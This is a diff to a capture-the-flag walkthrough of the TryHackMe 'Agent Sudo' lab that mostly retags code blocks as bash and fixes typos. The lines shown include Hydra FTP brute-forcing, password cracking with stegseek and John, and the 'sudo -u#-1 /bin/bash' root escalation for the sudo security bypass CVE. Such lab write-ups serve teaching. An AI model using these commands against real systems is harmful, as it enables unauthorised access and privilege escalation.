@@ -36,7 +36,7 @@
 
 `sudo nmap -sV -sC -T4 $ip`
 
-```
+```bash
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -52,7 +52,7 @@ This answers our 1st question of how many ports are open.
 
 `gobuster dir -u http://$ip -t 30 -r -x php,txt,html -w dir-med.txt`
 
-```
+```bash
 /index.php            (Status: 200) [Size: 218]
 ```
 
@@ -100,7 +100,7 @@ We saw that FTP was open from our nmap scan earlier and I fire up Hydra and try 
 
 `hydra -l <REDACTED> -P rockyou.txt $ip ftp -V`
 
-```
+```bash
 [21][ftp] host: 10.10.14.106   login: <REDACTED>   password: <REDACTED>
 ```
 
@@ -108,7 +108,7 @@ Sure enough, that was weak and it gives us the answer to the FTP password questi
 
 I login and download the files there:
 
-```
+```bash
 Connected to 10.10.14.106.
 220 (vsFTPd 3.0.3)
 Name (10.10.14.106:kali): <REDACTED>
@@ -170,7 +170,7 @@ I try and use steghide on the .jpg picture but it requires a password:
 
 `steghide extract -sf cute-alien.jpg`
 
-```
+```bash
 Enter passphrase: 
 steghide: could not extract any data with that passphrase!
 ```
@@ -179,7 +179,7 @@ Time to dust off stegseek, which is a great tool for cracking these passwords:
 
 `stegseek -wl rockyou.txt cute-alien.jpg`
 
-```
+```bash
 StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 
 [i] Found passphrase: "<REDACTED>"
@@ -211,7 +211,7 @@ We can't use steghide on .png files so I use foremost instead:
 
 `foremost -i cutie.png`
 
-```
+```bash
 Processing: cutie.png
 |foundat=To_agentR.txt�
 *|
@@ -219,7 +219,7 @@ Processing: cutie.png
 
 A directory called _cutie.png.extracted was created and it extracted the hidden files there:
 
-```
+```bash
 ┌──(kali㉿kali)-[~/work/_cutie.png.extracted]
 └─$ ls -al
 total 324
@@ -235,7 +235,7 @@ I try and unzip the file and get an error message:
 
 `unzip 8702.zip`
 
-```
+```bash
 Archive:  8702.zip
    skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
 ```
@@ -244,7 +244,7 @@ I google that and people suggest using 7zip instead so I try that:
 
 `7z e 8702.zip`
 
-```
+```bash
 Enter password (will not be echoed):
 ERROR: Wrong password : To_agentR.txt
 ```
@@ -257,7 +257,7 @@ And then use John the Ripper to crack it:
 
 `john hash --wordlist=../rockyou.txt`
 
-```
+```bash
 Using default input encoding: UTF-8
 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
 Cost 1 (HMAC size) is 78 for all loaded hashes
@@ -273,7 +273,7 @@ That gives us the answer to the zip file password question.
 
 I try and uncompress it again with 7zip:
 
-```
+```bash
 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-10600K CPU @ 4.10GHz (A0655),ASM)
 
@@ -307,7 +307,7 @@ Compressed: 280
 
 It extracted and overwrote the existing To_agentR.txt file:
 
-```
+```bash
 -rw-r--r-- 1 kali kali     86 Oct 29  2019 To_agentR.txt
 ```
 
@@ -348,8 +348,8 @@ We should be able to SSH in now that we have an agents name and password:
 
 `ssh james@$ip`
 
-```
-he authenticity of host '10.10.14.106 (10.10.14.106)' can't be established.
+```bash
+The authenticity of host '10.10.14.106 (10.10.14.106)' can't be established.
 ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
 This key is not known by any other names
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -385,7 +385,7 @@ We find the user flag sitting in his home directory which answers the what is th
 
 `wc -c /home/james/user_flag.txt`
 
-```
+```bash
 33 /home/james/user_flag.txt
 ```
 
@@ -393,7 +393,7 @@ Looking at the rest of the files in the home directory shows us the "real" alien
 
 `scp james@$ip:/home/james/Alien_autospy.jpg ~/work/Alien_autospy.jpg`
 
-```
+```bash
 james@10.10.14.106's password: 
 Alien_autospy.jpg                                                     100%   41KB 108.5KB/s   00:00
 ```
@@ -402,7 +402,7 @@ Taking a quick look at the picture:
 
 ![](images/agentsudo10.jpg)
 
-And THM wants to know what the incident is called, which I know off hand having seen the picture before. But in case you didn't you can use a reverse image search it with TinEye. I click this result:
+And THM wants to know what the incident is called, which I know off hand having seen the picture before. But in case you didn't you can use a reverse image search on it with TinEye. I click this result:
 
 ![](images/agentsudo11.png)
 
@@ -414,7 +414,7 @@ Now on to escalation and they want us to use a specific CVE that we need to find
 
 Looking at `id` shows us we're a member of sudo and several other groups:
 
-```
+```bash
 uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
 ```
 
@@ -443,7 +443,7 @@ Over in /var/FTP we see the fake alien pictures and To_agentJ.txt file we found 
 
 I check `sudo -l` and it shows:
 
-```
+```bash
 Matching Defaults entries for james on agent-sudo:                                                      
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -457,7 +457,7 @@ I happened to have seen something like this before and there's a sudo exploit sp
 
 This is the one we're looking for:
 
-```
+```bash
 sudo 1.8.27 - Security Bypass                                         | linux/local/47502.py
 ```
 
@@ -465,7 +465,7 @@ Checking the sudo version on the system to make sure it's vulnerable:
 
 `sudo --version`
 
-```
+```bash
 Sudo version 1.8.21p2
 Sudoers policy plugin version 1.8.21p2
 Sudoers file grammar version 46
@@ -526,7 +526,7 @@ I run the exploit command:
 
 And we get root!
 
-```
+```bash
 james@agent-sudo:/tmp$ sudo -u#-1 /bin/bash
 [sudo] password for james: 
 root@agent-sudo:/tmp# whoami
